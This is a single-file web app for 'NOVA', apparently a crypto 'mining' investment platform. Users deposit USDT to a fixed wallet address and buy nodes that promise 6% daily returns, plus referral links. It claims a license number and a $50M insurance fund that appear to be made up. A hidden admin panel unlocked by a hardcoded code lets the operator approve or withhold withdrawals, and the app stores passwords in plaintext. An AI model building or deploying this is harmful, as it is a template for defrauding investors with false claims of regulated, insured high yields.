<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --gold: #D4AF37; --bg: #050505; --card: rgba(255,255,255,0.03); }
        body { background: var(--bg); color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .app-card { background: var(--card); border: 1px solid rgba(255,255,255,0.05); border-radius: 24px; transition: 0.3s; }
        .gold-glow { border: 1px solid rgba(212, 175, 55, 0.3); box-shadow: 0 0 20px rgba(212, 175, 55, 0.1); }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(10,10,10,0.98); backdrop-filter: blur(20px); border-top: 1px solid #1a1a1a; display: flex; justify-content: space-around; padding: 15px; z-index: 1000; }
        .nav-item { color: #444; font-size: 9px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .nav-item.active { color: var(--gold); }
        .screen { display: none; padding-bottom: 120px; animation: fadeIn 0.4s ease; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .modal { display: none; position: fixed; inset: 0; background: black; z-index: 2000; padding: 25px; overflow-y: auto; }
        .nova-input { background: #0c0c0c; border: 1px solid #1a1a1a; width: 100%; padding: 18px; border-radius: 20px; color: white; font-size: 14px; outline: none; }
        .node-img { height: 100px; width: 100%; object-fit: cover; opacity: 0.4; border-radius: 20px 20px 0 0; }
        .admin-badge { background: #ff3b3b; color: white; font-size: 8px; padding: 2px 6px; border-radius: 5px; font-weight: 900; }
    </style>
</head>
<body>

    <div id="auth-screen" class="min-h-screen flex flex-col items-center justify-center p-8 active-screen">
        <h1 onclick="handleTaps()" class="text-6xl font-black mb-2 tracking-tighter">NOVA<span class="text-[#D4AF37]">.</span></h1>
        <p class="text-[8px] tracking-[5px] text-gray-600 uppercase mb-12 font-bold">Global Asset Protocol</p>
        <div class="app-card p-8 w-full max-w-sm">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input mb-4">
            <input type="password" id="u-pass" placeholder="Passkey" class="nova-input mb-4">
            <input type="text" id="adm-key" placeholder="Admin Secret Code" class="hidden nova-input border-[#D4AF37] mb-6">
            <button onclick="auth()" class="w-full bg-[#D4AF37] text-black py-5 rounded-2xl font-black text-xs tracking-widest">INITIALIZE SESSION</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-8 text-gray-500 uppercase font-bold cursor-pointer">Register New Identity</p>
        </div>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-gray-900 pb-4">
            <h2 class="text-[#D4AF37] font-black uppercase text-sm">Central Command</h2>
            <button onclick="location.reload()" class="text-red-500 font-black text-xs">EXIT SYSTEM</button>
        </div>
        <div id="adm-list" class="space-y-4">
            </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-black/80 backdrop-blur-md z-50">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 app-card flex items-center justify-center text-[#D4AF37] font-black border-[#D4AF37]/20">N</div>
                <div>
                    <div class="flex items-center gap-1">
                        <p id="user-id-txt" class="text-xs font-black"></p>
                        <i class="fa-solid fa-circle-check text-blue-500 text-[10px]"></i>
                    </div>
                    <p class="text-[8px] text-gray-600 font-bold uppercase tracking-widest">Verified Member</p>
                </div>
            </div>
            <i onclick="logout()" class="fa-solid fa-power-off text-gray-800 text-lg"></i>
        </header>

        <div id="dash-screen" class="screen active-screen p-6">
            <div class="app-card p-10 mb-8 gold-glow text-center">
                <p class="text-[9px] text-gray-500 font-black tracking-widest mb-3">TOTAL LIQUIDITY</p>
                <h1 id="main-bal" class="text-5xl font-black tracking-tighter mb-4">$0.00</h1>
                <div class="inline-flex items-center gap-2 bg-green-500/10 px-4 py-1 rounded-full">
                    <p id="v-daily" class="text-green-500 text-[9px] font-black">+$0.00 DAILY</p>
                </div>
            </div>

            <div class="grid grid-cols-4 gap-2 mb-10 text-center">
                <div onclick="openModal('dep-modal')" class="flex flex-col gap-2">
                    <div class="app-card h-14 flex items-center justify-center text-green-500"><i class="fa-solid fa-plus"></i></div>
                    <span class="text-[8px] font-black text-gray-500">DEPOSIT</span>
                </div>
                <div onclick="openModal('wd-modal')" class="flex flex-col gap-2">
                    <div class="app-card h-14 flex items-center justify-center text-red-500"><i class="fa-solid fa-minus"></i></div>
                    <span class="text-[8px] font-black text-gray-500">WITHDRAW</span>
                </div>
                <div onclick="openModal('legal-modal')" class="flex flex-col gap-2">
                    <div class="app-card h-14 flex items-center justify-center text-blue-500"><i class="fa-solid fa-building-columns"></i></div>
                    <span class="text-[8px] font-black text-gray-500">COMPANY</span>
                </div>
                <div onclick="openModal('faq-modal')" class="flex flex-col gap-2">
                    <div class="app-card h-14 flex items-center justify-center text-[#D4AF37]"><i class="fa-solid fa-headset"></i></div>
                    <span class="text-[8px] font-black text-gray-500">SUPPORT</span>
                </div>
            </div>

            <h3 class="text-[10px] font-black text-gray-700 mb-5 tracking-widest uppercase">Live Ledger</h3>
            <div id="hist-mini" class="space-y-3"></div>
        </div>

        <div id="mine-screen" class="screen p-6">
            <h2 class="text-2xl font-black mb-1 gold-text uppercase">Mining Core</h2>
            <p class="text-[9px] text-gray-600 mb-8 uppercase tracking-widest">Deploy Liquid Staking Nodes</p>
            <div id="nodes-container" class="space-y-6"></div>
        </div>

        <div id="office-screen" class="screen p-6">
            <h2 class="text-2xl font-black mb-8 uppercase">Network Office</h2>
            <div class="app-card p-8 text-center mb-8">
                <i class="fa-solid fa-link text-[#D4AF37] text-2xl mb-4"></i>
                <p class="text-[10px] font-bold text-gray-500 mb-4 uppercase">Referral Link</p>
                <div id="ref-link" class="bg-black/50 p-4 rounded-xl border border-white/5 text-[9px] font-mono text-gray-400 break-all select-all"></div>
            </div>
            <div class="app-card p-6 border-l-4 border-green-500">
                <p class="text-[10px] font-black uppercase text-gray-500">Global Network Fee</p>
                <p class="text-xl font-black">0.5% FIXED</p>
            </div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-house-chimney text-xl"></i><span>HOME</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-server text-xl"></i><span>MINING</span></div>
            <div onclick="nav('office-screen')" class="nav-item" id="nav-office"><i class="fa-solid fa-globe text-xl"></i><span>OFFICE</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div onclick="closeModal('dep-modal')" class="mb-10 text-gray-500 font-bold text-xs">CLOSE</div>
        <h2 class="text-3xl font-black mb-8 gold-text uppercase">Deposit</h2>
        <div class="app-card p-5 mb-6 border-dashed border-gray-800 text-center"><p class="text-[10px] text-gray-500 mb-2">USDT BEP20 Address</p><p class="text-xs font-black break-all">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p></div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="nova-input mb-4">
        <input type="text" id="dep-tid" placeholder="Transaction TXID" class="nova-input mb-6">
        <button onclick="requestFin('Deposit')" class="w-full bg-[#D4AF37] text-black py-5 rounded-2xl font-black">SUBMIT DEPOSIT</button>
    </div>

    <div id="wd-modal" class="modal">
        <div onclick="closeModal('wd-modal')" class="mb-10 text-gray-500 font-bold text-xs">CLOSE</div>
        <h2 class="text-3xl font-black mb-8 text-red-500 uppercase">Withdraw</h2>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="nova-input mb-4">
        <input type="text" id="wd-addr" placeholder="Destination Address" class="nova-input mb-6">
        <button onclick="requestFin('Withdrawal')" class="w-full bg-white text-black py-5 rounded-2xl font-black">SEND ASSETS</button>
    </div>

    <div id="legal-modal" class="modal">
        <div onclick="closeModal('legal-modal')" class="mb-10 text-gray-500 font-bold text-xs">CLOSE</div>
        <h2 class="text-3xl font-black mb-6 gold-text">LEGAL</h2>
        <div class="app-card p-6 mb-6">
            <h4 class="font-black mb-2 text-xs uppercase">MSB License #31000214859621</h4>
            <p class="text-[10px] text-gray-500 leading-relaxed">NOVA is a registered digital asset provider regulated under global financial authorities. All investments are protected by a $50M SAIF Insurance fund.</p>
        </div>
        <div class="space-y-4">
            <p class="text-[11px] font-black uppercase text-white">Privacy Policy</p>
            <p class="text-[9px] text-gray-600">Your data is encrypted using military-grade AES-256 protocols. No personal information is ever shared with third parties.</p>
        </div>
    </div>

    <div id="faq-modal" class="modal">
        <div onclick="closeModal('faq-modal')" class="mb-10 text-gray-500 font-bold text-xs">CLOSE</div>
        <h2 class="text-3xl font-black mb-8 blue-text">SUPPORT</h2>
        <div class="space-y-4">
            <div class="app-card p-5"><p class="text-[10px] font-black mb-2 uppercase">How to mine?</p><p class="text-[9px] text-gray-500">Select a machine in 'Mining' and click BUY. Yield starts every 24h.</p></div>
            <div class="app-card p-5"><p class="text-[10px] font-black mb-2 uppercase">Withdrawal time?</p><p class="text-[9px] text-gray-500">Standard: 24h. VIP: 2h.</p></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let isLogin = true;

        window.onload = () => {
            const saved = localStorage.getItem('nova_user');
            if(saved) start(saved);
            renderNodes();
        };

        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "Register New Identity" : "Back to Login"; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            const ak = document.getElementById('adm-key').value;
            
            if(ak === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return alert("Credentials Missing");

            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(!isLogin) {
                if(snap.exists()) return alert("ID Taken");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, time: Date.now() });
                localStorage.setItem('nova_user', id); start(id);
            } else if(snap.exists() && snap.data().password === pw) {
                localStorage.setItem('nova_user', id); start(id);
            } else alert("Auth Failed");
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-id-txt').innerText = id.toUpperCase();
            onSnapshot(doc(db, "users", id), d => {
                document.getElementById('main-bal').innerText = "$" + (d.data().balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "+$" + (d.data().daily || 0).toFixed(2) + " DAILY";
            });
            document.getElementById('ref-link').innerText = window.location.origin + "?ref=" + id;
            loadHistory();
        }

        function renderNodes() {
            const container = document.getElementById('nodes-container');
            container.innerHTML = "";
            for(let i=1; i<=20; i++) {
                let price = i === 1 ? 15 : (i * 50) + (i > 10 ? i*500 : 0);
                if(i === 20) price = 20000;
                let yieldVal = (price * 0.06).toFixed(2);
                container.innerHTML += `
                    <div class="app-card overflow-hidden">
                        <img src="https://picsum.photos/400/200?random=${i}" class="node-img">
                        <div class="p-6 flex justify-between items-center">
                            <div><p class="text-[9px] font-black text-gray-500 uppercase">NODE ${i}</p><p class="text-xl font-black">$${price}</p><p class="text-[8px] text-green-500 font-bold">YIELD: +$${yieldVal}/day</p></div>
                            <button onclick="buyNode(${price}, ${yieldVal})" class="bg-white text-black px-6 py-3 rounded-xl text-[10px] font-black uppercase">Activate</button>
                        </div>
                    </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const r = doc(db, "users", activeUser); const s = await getDoc(r);
            if(s.data().balance < p) return alert("Insufficient Liquidity");
            await updateDoc(r, { balance: s.data().balance - p, daily: (s.data().daily || 0) + d });
            alert("Node Synchronized!");
        };

        window.requestFin = async (type) => {
            const amtId = type === 'Deposit' ? 'dep-amt' : 'wd-amt';
            const amt = parseFloat(document.getElementById(amtId).value);
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            
            if(type === 'Withdrawal' && (s.data().balance < amt || !amt)) return alert("Liquidity Error");
            
            const logData = { user: activeUser, amount: amt, type, status: 'Pending', time: Date.now() };
            if(type === 'Deposit') logData.tid = document.getElementById('dep-tid').value;
            if(type === 'Withdrawal') { logData.addr = document.getElementById('wd-addr').value; await updateDoc(uRef, { balance: s.data().balance - amt }); }
            
            await addDoc(collection(db, "logs"), logData);
            alert("Transmission Sent"); closeModal(type === 'Deposit' ? 'dep-modal' : 'wd-modal');
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", activeUser)), s => {
                const list = document.getElementById('hist-mini'); list.innerHTML = "";
                let arr = []; s.forEach(d => arr.push(d.data()));
                arr.sort((a,b) => b.time - a.time).slice(0,3).forEach(t => {
                    list.innerHTML += `<div class="app-card p-4 flex justify-between items-center text-[9px] uppercase font-bold">
                        <span class="${t.type=='Deposit'?'text-green-500':'text-red-500'}">${t.type}</span>
                        <span>$${t.amount}</span>
                        <span class="text-gray-600">${t.status}</span>
                    </div>`;
                });
            });
        }

        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-list'); al.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    al.innerHTML += `<div class="app-card p-5 border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'}">
                        <div class="flex justify-between mb-3 text-[10px] font-black uppercase"><span>${r.user}</span><span>$${r.amount}</span></div>
                        <p class="text-[8px] text-gray-500 mb-4 break-all">ID/ADDR: ${r.tid || r.addr}</p>
                        <div class="flex gap-2">
                            <button onclick="approve('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-green-600 py-3 rounded-lg text-[9px] font-bold">APPROVE</button>
                            <button onclick="reject('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-red-600 py-3 rounded-lg text-[9px] font-bold">REJECT</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approve = async (id, u, a, t) => {
            if(t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            await updateDoc(doc(db, "logs", id), { status: 'Success' });
        };

        window.reject = async (id, u, a, t) => {
            if(t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); }
            await updateDoc(doc(db, "logs", id), { status: 'Rejected' });
        };

        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
    </script>
</body>
</html>
